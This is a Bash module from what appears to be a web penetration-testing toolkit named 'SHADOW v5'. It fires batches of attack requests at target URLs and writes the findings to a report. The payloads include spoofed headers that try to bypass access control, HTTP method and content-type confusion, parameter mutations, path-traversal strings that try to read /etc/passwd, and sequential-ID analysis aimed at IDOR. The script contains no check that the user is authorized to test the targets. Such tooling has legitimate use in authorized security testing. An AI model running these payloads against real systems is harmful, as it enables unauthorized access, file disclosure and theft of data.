#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# SHADOW v5 - Module 15: Assumption Breaker
# ═══════════════════════════════════════════════════════════════════════════════
# Advanced testing that breaks server assumptions
# This is where real bugs are found - not in scanners
# ═══════════════════════════════════════════════════════════════════════════════

MODULE="15_ASSUME"

run() {
    local target="$1"
    local base="$2"
    
    banner "🔓 ASSUMPTION BREAKER → $target"
    
    mkdir -p "$base/assume"
    
    # Get high-value targets
    local targets_file="$base/brain/high_value.txt"
    [[ ! -f "$targets_file" ]] && targets_file="$base/http/alive.txt"
    
    if [[ ! -s "$targets_file" ]]; then
        log_error "No targets found. Run previous modules first."
        return 1
    fi
    
    # Limit for testing
    head -50 "$targets_file" > "$base/assume/test_targets.txt"
    local target_count=$(wc -l < "$base/assume/test_targets.txt")
    
    log_info "Testing $target_count endpoints for assumption flaws..."
    
    # ─────────────────────────────────────────────────────────────────────────
    # 1. HEADER INJECTION (X-Forwarded-For, X-Original-URL, etc.)
    # ─────────────────────────────────────────────────────────────────────────
    log_info "🔧 Testing header-based access control bypass..."
    
    : > "$base/assume/header_bypass.txt"
    
    # Headers that can bypass access control
    local bypass_headers=(
        "X-Forwarded-For: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Original-URL: /admin"
        "X-Rewrite-URL: /admin"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Host: localhost"
        "X-Forwarded-Server: localhost"
        "X-HTTP-Host-Override: localhost"
        "Forwarded: for=127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "CF-Connecting-IP: 127.0.0.1"
        "X-ProxyUser-Ip: 127.0.0.1"
    )
    
    while IFS= read -r url; do
        # Baseline request
        local baseline=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" \
            --max-time 10 "$url" 2>/dev/null)
        local base_status=$(echo "$baseline" | cut -d'|' -f1)
        local base_size=$(echo "$baseline" | cut -d'|' -f2)
        
        # Test with bypass headers
        for header in "${bypass_headers[@]}"; do
            local result=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" \
                --max-time 10 -H "$header" "$url" 2>/dev/null)
            local new_status=$(echo "$result" | cut -d'|' -f1)
            local new_size=$(echo "$result" | cut -d'|' -f2)
            
            # Status changed? Or significant size difference?
            if [[ "$new_status" != "$base_status" ]]; then
                echo "🚨 STATUS CHANGE: $url" >> "$base/assume/header_bypass.txt"
                echo "   Header: $header" >> "$base/assume/header_bypass.txt"
                echo "   $base_status → $new_status" >> "$base/assume/header_bypass.txt"
                echo "" >> "$base/assume/header_bypass.txt"
            elif [[ $((new_size - base_size)) -gt 500 ]] || [[ $((base_size - new_size)) -gt 500 ]]; then
                echo "⚠️ SIZE DIFF: $url" >> "$base/assume/header_bypass.txt"
                echo "   Header: $header" >> "$base/assume/header_bypass.txt"
                echo "   Size: $base_size → $new_size" >> "$base/assume/header_bypass.txt"
                echo "" >> "$base/assume/header_bypass.txt"
            fi
        done
    done < <(head -20 "$base/assume/test_targets.txt")
    
    local header_findings=$(grep -c "🚨\|⚠️" "$base/assume/header_bypass.txt" 2>/dev/null || echo 0)
    log_found "Header bypass findings: $header_findings"
    
    # ─────────────────────────────────────────────────────────────────────────
    # 2. METHOD CONFUSION (GET vs POST vs PUT vs DELETE)
    # ─────────────────────────────────────────────────────────────────────────
    log_info "🔄 Testing HTTP method confusion..."
    
    : > "$base/assume/method_confusion.txt"
    
    local methods=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD" "TRACE")
    
    while IFS= read -r url; do
        local method_results=""
        local has_confusion=false
        
        for method in "${methods[@]}"; do
            local status=$(curl -s -o /dev/null -w "%{http_code}" \
                --max-time 10 -X "$method" "$url" 2>/dev/null)
            method_results="$method_results $method:$status"
            
            # Track unique statuses
            echo "$status" >> /tmp/method_statuses_$$
        done
        
        # Check if different methods give different results
        local unique_statuses=$(sort -u /tmp/method_statuses_$$ | wc -l)
        rm -f /tmp/method_statuses_$$
        
        if [[ $unique_statuses -gt 2 ]]; then
            echo "🚨 METHOD CONFUSION: $url" >> "$base/assume/method_confusion.txt"
            echo "   Results:$method_results" >> "$base/assume/method_confusion.txt"
            echo "" >> "$base/assume/method_confusion.txt"
        fi
    done < <(head -30 "$base/assume/test_targets.txt")
    
    local method_findings=$(grep -c "🚨" "$base/assume/method_confusion.txt" 2>/dev/null || echo 0)
    log_found "Method confusion findings: $method_findings"
    
    # ─────────────────────────────────────────────────────────────────────────
    # 3. CONTENT-TYPE MANIPULATION
    # ─────────────────────────────────────────────────────────────────────────
    log_info "📄 Testing Content-Type manipulation..."
    
    : > "$base/assume/content_type.txt"
    
    local content_types=(
        "application/json"
        "application/xml"
        "application/x-www-form-urlencoded"
        "text/plain"
        "text/html"
        "multipart/form-data"
        "application/javascript"
    )
    
    while IFS= read -r url; do
        # Only test POST-able endpoints
        if ! echo "$url" | grep -qEi "api|submit|create|update|add|save|upload"; then
            continue
        fi
        
        local baseline=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time 10 -X POST "$url" 2>/dev/null)
        
        for ct in "${content_types[@]}"; do
            local result=$(curl -s -o /dev/null -w "%{http_code}" \
                --max-time 10 -X POST \
                -H "Content-Type: $ct" \
                -d '{"test":1}' "$url" 2>/dev/null)
            
            if [[ "$result" != "$baseline" ]] && [[ "$result" =~ ^(200|201|202)$ ]]; then
                echo "🚨 CONTENT-TYPE BYPASS: $url" >> "$base/assume/content_type.txt"
                echo "   Type: $ct → Status: $result" >> "$base/assume/content_type.txt"
                echo "" >> "$base/assume/content_type.txt"
            fi
        done
    done < <(head -20 "$base/assume/test_targets.txt")
    
    # ─────────────────────────────────────────────────────────────────────────
    # 4. ACCEPT HEADER MANIPULATION
    # ─────────────────────────────────────────────────────────────────────────
    log_info "📥 Testing Accept header manipulation..."
    
    : > "$base/assume/accept_header.txt"
    
    local accept_types=(
        "application/json"
        "application/xml"
        "text/html"
        "text/plain"
        "*/*"
        "application/pdf"
        "application/octet-stream"
    )
    
    while IFS= read -r url; do
        for accept in "${accept_types[@]}"; do
            local response=$(curl -s --max-time 10 \
                -H "Accept: $accept" "$url" 2>/dev/null | head -c 500)
            
            # Check if response format changed (JSON vs HTML vs XML)
            if echo "$response" | grep -q "^{" && [[ "$accept" == "application/json" ]]; then
                echo "$url accepts JSON" >> "$base/assume/accept_header.txt"
            elif echo "$response" | grep -q "^<\?xml" && [[ "$accept" == "application/xml" ]]; then
                echo "$url returns XML with Accept: $accept" >> "$base/assume/accept_header.txt"
            fi
        done
    done < <(head -15 "$base/assume/test_targets.txt")
    
    # ─────────────────────────────────────────────────────────────────────────
    # 5. NEGATIVE TESTING (Invalid Inputs)
    # ─────────────────────────────────────────────────────────────────────────
    log_info "❌ Running negative testing..."
    
    : > "$base/assume/negative_test.txt"
    
    # Get URLs with parameters
    local param_urls="$base/params/urls_with_params.txt"
    [[ ! -f "$param_urls" ]] && param_urls="$base/brain/candidates.txt"
    
    if [[ -s "$param_urls" ]]; then
        # Test mutations
        local mutations=(
            's/=[^&]*/=null/g'           # null values
            's/=[^&]*/=/g'               # empty values
            's/=[0-9]\+/=-1/g'           # negative numbers
            's/=[0-9]\+/=0/g'            # zero
            's/=[0-9]\+/=99999999999/g'  # large numbers
            's/=[^&]*/=[]/g'             # empty array
            's/=[^&]*/={}/g'             # empty object
            's/=[^&]*/=undefined/g'      # undefined
            's/=[^&]*/=NaN/g'            # NaN
            's/=[^&]*/=true/g'           # boolean
        )
        
        while IFS= read -r url; do
            local baseline=$(curl -s -o /dev/null -w "%{http_code}" \
                --max-time 10 "$url" 2>/dev/null)
            
            for mutation in "${mutations[@]}"; do
                local mutated_url=$(echo "$url" | sed "$mutation")
                local result=$(curl -s -o /dev/null -w "%{http_code}" \
                    --max-time 10 "$mutated_url" 2>/dev/null)
                
                # Look for errors or unexpected success
                if [[ "$result" == "500" ]] || [[ "$result" == "502" ]] || [[ "$result" == "503" ]]; then
                    echo "🚨 SERVER ERROR with mutation: $mutation" >> "$base/assume/negative_test.txt"
                    echo "   URL: $mutated_url" >> "$base/assume/negative_test.txt"
                    echo "   Status: $result" >> "$base/assume/negative_test.txt"
                    echo "" >> "$base/assume/negative_test.txt"
                elif [[ "$baseline" =~ ^(401|403)$ ]] && [[ "$result" == "200" ]]; then
                    echo "🚨 BYPASS with mutation: $mutation" >> "$base/assume/negative_test.txt"
                    echo "   URL: $mutated_url" >> "$base/assume/negative_test.txt"
                    echo "   $baseline → $result" >> "$base/assume/negative_test.txt"
                    echo "" >> "$base/assume/negative_test.txt"
                fi
            done
        done < <(head -20 "$param_urls")
    fi
    
    local negative_findings=$(grep -c "🚨" "$base/assume/negative_test.txt" 2>/dev/null || echo 0)
    log_found "Negative testing findings: $negative_findings"
    
    # ─────────────────────────────────────────────────────────────────────────
    # 6. PATH TRAVERSAL ASSUMPTIONS
    # ─────────────────────────────────────────────────────────────────────────
    log_info "📁 Testing path traversal assumptions..."
    
    : > "$base/assume/path_traversal.txt"
    
    local path_payloads=(
        "../"
        "..%2f"
        "..%252f"
        "..%c0%af"
        "..%255c"
        "..../"
        "....%2f"
        "..;/"
        "%2e%2e/"
        "%2e%2e%2f"
    )
    
    # Find file-related parameters
    grep -Ei "[?&](file|path|doc|template|page|include|src|dir|folder)=" \
        "$base/params/urls_with_params.txt" 2>/dev/null | head -20 | while IFS= read -r url; do
        
        for payload in "${path_payloads[@]}"; do
            local test_url=$(echo "$url" | sed "s/=\([^&]*\)/=${payload}etc\/passwd/")
            local response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
            
            if echo "$response" | grep -q "root:"; then
                echo "🚨 LFI CONFIRMED: $test_url" >> "$base/assume/path_traversal.txt"
            fi
        done
    done
    
    # ─────────────────────────────────────────────────────────────────────────
    # 7. ID ENTROPY ANALYSIS (Predictable IDs)
    # ─────────────────────────────────────────────────────────────────────────
    log_info "🔢 Analyzing ID entropy..."
    
    : > "$base/assume/id_entropy.txt"
    
    # Extract IDs from URLs
    grep -oE "[?&](id|user_id|order_id|doc_id|item_id|account_id)=[^&]+" \
        "$base/params/urls_with_params.txt" 2>/dev/null | \
        cut -d= -f2 | sort -u > "$base/assume/extracted_ids.txt"
    
    if [[ -s "$base/assume/extracted_ids.txt" ]]; then
        # Analyze ID patterns
        echo "=== ID Pattern Analysis ===" >> "$base/assume/id_entropy.txt"
        echo "" >> "$base/assume/id_entropy.txt"
        
        # Numeric sequential?
        local numeric_ids=$(grep -E "^[0-9]+$" "$base/assume/extracted_ids.txt" | sort -n)
        if [[ -n "$numeric_ids" ]]; then
            local min_id=$(echo "$numeric_ids" | head -1)
            local max_id=$(echo "$numeric_ids" | tail -1)
            local count=$(echo "$numeric_ids" | wc -l)
            
            echo "Numeric IDs found: $count" >> "$base/assume/id_entropy.txt"
            echo "Range: $min_id - $max_id" >> "$base/assume/id_entropy.txt"
            
            # Check if sequential
            if [[ $((max_id - min_id)) -lt $((count * 2)) ]]; then
                echo "⚠️ IDs appear SEQUENTIAL → IDOR likely!" >> "$base/assume/id_entropy.txt"
            fi
            echo "" >> "$base/assume/id_entropy.txt"
        fi
        
        # UUID format?
        local uuid_ids=$(grep -Ei "^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$" \
            "$base/assume/extracted_ids.txt")
        if [[ -n "$uuid_ids" ]]; then
            echo "UUID format detected (harder to enumerate)" >> "$base/assume/id_entropy.txt"
        fi
        
        # Short/weak IDs?
        local weak_ids=$(awk 'length($0) < 6' "$base/assume/extracted_ids.txt")
        if [[ -n "$weak_ids" ]]; then
            echo "⚠️ Short IDs detected (< 6 chars) → Bruteforceable!" >> "$base/assume/id_entropy.txt"
            echo "$weak_ids" | head -10 >> "$base/assume/id_entropy.txt"
        fi
        
        # ID length distribution
        echo "" >> "$base/assume/id_entropy.txt"
        echo "ID Length Distribution:" >> "$base/assume/id_entropy.txt"
        awk '{print length($0)}' "$base/assume/extracted_ids.txt" | \
            sort | uniq -c | sort -rn >> "$base/assume/id_entropy.txt"
    fi
    
    # ─────────────────────────────────────────────────────────────────────────
    # 8. JSON STRUCTURE ANALYSIS
    # ─────────────────────────────────────────────────────────────────────────
    log_info "📊 Analyzing response data structures..."
    
    : > "$base/assume/json_analysis.txt"
    
    # Get API endpoints
    grep -Ei "/api/|/v[0-9]+/" "$base/assume/test_targets.txt" | head -20 | while IFS= read -r url; do
        local response=$(curl -s --max-time 10 -H "Accept: application/json" "$url" 2>/dev/null)
        
        # Check if valid JSON
        if echo "$response" | jq empty 2>/dev/null; then
            echo "=== $url ===" >> "$base/assume/json_analysis.txt"
            
            # Get structure
            local structure=$(echo "$response" | jq 'type' 2>/dev/null)
            echo "Type: $structure" >> "$base/assume/json_analysis.txt"
            
            # Get top-level keys
            local keys=$(echo "$response" | jq 'keys?' 2>/dev/null | tr -d '[]"' | tr ',' ' ')
            echo "Keys: $keys" >> "$base/assume/json_analysis.txt"
            
            # Look for sensitive fields
            if echo "$response" | jq -e '.password, .token, .secret, .api_key, .private_key' 2>/dev/null | grep -qv null; then
                echo "🚨 SENSITIVE DATA IN RESPONSE!" >> "$base/assume/json_analysis.txt"
            fi
            
            # Look for user data
            if echo "$response" | jq -e '.email, .phone, .address, .ssn, .credit_card' 2>/dev/null | grep -qv null; then
                echo "⚠️ PII data exposed" >> "$base/assume/json_analysis.txt"
            fi
            
            echo "" >> "$base/assume/json_analysis.txt"
        fi
    done
    
    # ─────────────────────────────────────────────────────────────────────────
    # GENERATE REPORT
    # ─────────────────────────────────────────────────────────────────────────
    cat > "$base/assume/ASSUMPTION_REPORT.txt" << EOF
═══════════════════════════════════════════════════════════════════════════════
                    🔓 ASSUMPTION BREAKER REPORT
                    Target: $target
                    Generated: $(date)
═══════════════════════════════════════════════════════════════════════════════

This module tests what the application ASSUMES about your requests.
Every finding = developer assumption broken = potential vulnerability.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 HEADER-BASED ACCESS CONTROL BYPASS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$(cat "$base/assume/header_bypass.txt" 2>/dev/null || echo "No findings")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔄 HTTP METHOD CONFUSION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$(cat "$base/assume/method_confusion.txt" 2>/dev/null || echo "No findings")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 CONTENT-TYPE BYPASS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$(cat "$base/assume/content_type.txt" 2>/dev/null || echo "No findings")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ NEGATIVE TESTING (Invalid Inputs)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$(cat "$base/assume/negative_test.txt" 2>/dev/null || echo "No findings")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 PATH TRAVERSAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$(cat "$base/assume/path_traversal.txt" 2>/dev/null || echo "No findings")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔢 ID ENTROPY ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$(cat "$base/assume/id_entropy.txt" 2>/dev/null || echo "No analysis")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 JSON STRUCTURE ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$(head -50 "$base/assume/json_analysis.txt" 2>/dev/null || echo "No analysis")

═══════════════════════════════════════════════════════════════════════════════
                    🎯 WHAT TO DO NEXT
═══════════════════════════════════════════════════════════════════════════════

1. Any "🚨" finding = High priority for manual testing
2. Header bypass = Try more variations in Burp
3. Method confusion = Test POST data on GET endpoints
4. Sequential IDs = IDOR almost guaranteed
5. Negative test errors = Dig deeper for injection

Remember: These tests BREAK ASSUMPTIONS.
Every assumption broken = Bug potential.

EOF
    
    separator
    log_success "Assumption breaking complete!"
    log_info "Report: $base/assume/ASSUMPTION_REPORT.txt"
    
    # Summary
    local total_findings=0
    total_findings=$((total_findings + $(grep -c "🚨" "$base/assume/header_bypass.txt" 2>/dev/null || echo 0)))
    total_findings=$((total_findings + $(grep -c "🚨" "$base/assume/method_confusion.txt" 2>/dev/null || echo 0)))
    total_findings=$((total_findings + $(grep -c "🚨" "$base/assume/negative_test.txt" 2>/dev/null || echo 0)))
    total_findings=$((total_findings + $(grep -c "🚨" "$base/assume/path_traversal.txt" 2>/dev/null || echo 0)))
    
    separator
    if [[ $total_findings -gt 0 ]]; then
        log_found "Total high-priority findings: $total_findings"
    else
        log_info "No critical findings (but check the report for warnings)"
    fi
    
    return 0
}
